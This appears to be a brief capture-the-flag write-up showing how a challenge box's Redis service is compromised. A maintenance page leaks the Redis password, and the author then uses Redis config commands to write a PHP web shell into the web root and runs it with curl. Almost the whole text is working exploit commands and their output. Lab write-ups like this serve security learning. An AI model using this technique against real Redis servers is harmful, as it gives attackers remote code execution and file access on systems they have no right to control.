curl http://localhost/maintenance.php?cmd=info |grep db

> db0:keys=2,expires=0,avg_ttl=0

cmd=config,get,*
> R3disp@ss

now we can interact with redis directly:

redis-cli
> AUTH R3disp@ss
OK

Now that we have access to redis we have remote code execution (by design!) see: https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

> config set dir /var/www/html (obtained from us checking that directory for easy pwn at start of challenge - got permission denied)
> config set dbfilename test.php
> set test "<?php system('cat index.php')>?"
> save
OK
>exit

curl http://localhost/test.php --output outfile
cat outfile
